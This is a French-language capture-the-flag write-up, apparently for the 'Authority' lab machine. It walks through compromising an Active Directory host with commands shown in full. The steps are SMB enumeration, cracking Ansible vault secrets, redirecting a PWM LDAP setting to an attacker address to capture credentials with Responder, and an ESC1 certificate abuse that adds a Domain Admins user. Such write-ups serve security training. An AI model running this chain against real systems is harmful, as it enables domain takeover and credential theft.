  # Authority

	echo "10.10.11.222 authority.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.222 -e tun0 > ports.txt
	sudo nmap -p- -T4 -A 10.10.11.222 -oN nmap.txt
    feroxbuster --silent -u http://authority.htb
    feroxbuster --silent -u http://authority.htb:8443
	
Scans classiques.

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft IIS httpd 10.0
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-15 21:52:50Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    8443/tcp  open  ssl/https-alt
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    49664/tcp open  msrpc         Microsoft Windows RPC
    49665/tcp open  msrpc         Microsoft Windows RPC
    49666/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    49673/tcp open  msrpc         Microsoft Windows RPC
    49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49689/tcp open  msrpc         Microsoft Windows RPC
    49691/tcp open  msrpc         Microsoft Windows RPC
    49692/tcp open  msrpc         Microsoft Windows RPC
    49700/tcp open  msrpc         Microsoft Windows RPC
    49709/tcp open  msrpc         Microsoft Windows RPC
    49712/tcp open  msrpc         Microsoft Windows RPC
    49732/tcp open  msrpc         Microsoft Windows RPC

Une page de login se trouve sur https://authority.htb:8443/pwm/private/login mais impossible de la contourner ou d'utiliser des mots de passe par défaut.

En revanche, il y a des partages SMB ouverts et un fichier YAML intéressant :

    smbclient -L //10.10.11.222 -N 
    smbclient -N //10.10.11.222/Development
    cd Automation\Ansible\PWM\defaults
    mget main.yml
    
    pipx install ansible-core
    ansible-vault view main.yml 
    
Un mot de passe est demandé pour lire le fichier. On ne possède pas ce mot de passe mais on va pouvoir convertir et tenter de cracker les credentials présents facilement avec JTR.

Il faut bien prendre toute la ligne commençant par "$ANSIBLE_VAULT" et retirer tous les espaces sauf celui qu'il y a après "AES256" :


    $ANSIBLE_VAULT;1.1;AES256 
    633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764


Il n'y en a que trois donc on peut tout faire rapidement : 

    vim ansible1.txt
    vim ansible2.txt
    vim ansible3.txt
    
    ansible2john ansible1.txt > hash1.txt
    ansible2john ansible2.txt > hash2.txt
    ansible2john ansible3.txt > hash3.txt
    
    john hash1.txt
    john hash2.txt
    john hash3.txt
    
On trouve le même mot de passe faible pour les trois, on va pouvoir l'utiliser pour tout déchiffrer : 

     cat vault1 | ansible-vault decrypt 
     cat vault2 | ansible-vault decrypt 
     cat vault3 | ansible-vault decrypt 


On obtient ce qui ressemble à un nom de compte de service et deux mots de passe. Impossible de les utiliser pour se connecter directement à l'AD mais ils fonctionnent pour le site web trouvé en :8443 

Le login classique renvoie une erreur mais on peut se connecter sur le gestionnaire de configuration : https://authority.htb:8443/pwm/private/config/manager 

On voit des logs d'erreurs sur une connexion échouée et la possibilité d'importer ou télécharger la configuration au format XML. 

En téléchargeant la configuration, on voit qu'il est possible de spécifier le serveur de destination : 

        <setting key="ldap.serverUrls" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING_ARRAY" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs</label>
            <value>ldaps://authority.authority.htb:636</value>
        </setting>
    
En mettant en place un Responder et en renvoyant ce fichier XML avec notre adresse on pourra sûrement récupérer des credentials ou des hashes : 

    sudo responder -I tun0
    vim PwmConfiguration.xml 
    
Valeur à mettre à la place de l'ancien serveur : 

> <value>ldap://10.10.16.95:389</value>

Après le redémarrage de l'application, on reçoit bien le mot de passe en clair pour l'utilisateur **"svc_ldap"**

    evil-winrm -u svc_ldap -p 'MDP' -i 10.10.11.222
    type C:\Users\svc_ldap\Desktop\user.txt
    

## Élévation de privilèges


    upload PrivEscCheck.ps1
    Import-Module .\PrivEscCheck.ps1
    Invoke-PrivEscCheck -Extended

    upload winpeas.exe
    .\winpeas.exe 

    certipy find -u svc_ldap -p 'MDP' -dc-ip 10.10.11.222
    cat 20231118120348_Certipy.json | grep vuln -i -A 10 -B 10


Le certificat "CorpVPN" semble vulnérable à l'ESC1.
Voir : https://github.com/ly4k/Certipy#esc1

    impacket-addcomputer 'authority.htb/svc_ldap:MDP' -dc-ip 10.10.11.222 -computer-name 'Mon_ordi' -computer-pass 'Mdp123!'
    
    certipy req -username 'Mon_ordi$' -password 'Mdp123!' -ca 'AUTHORITY-CA' -target 10.10.11.222 -template 'CorpVPN' -upn "administrator@authority.htb" -dns authority.authority.htb
    
    certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222 -ldap-shell

On obtient bien un shell LDAP, qui va nous permettre de créer un administrateur : 

    # help 
    # add_user tim
    # add_user_to_group tim "Domain Admins"
    
<br>
    
    impacket-psexec 'authority.htb/tim:*+^M9">U|p+4Gql'@10.10.11.222
    type C:\Users\Administrator\Desktop\root.txt
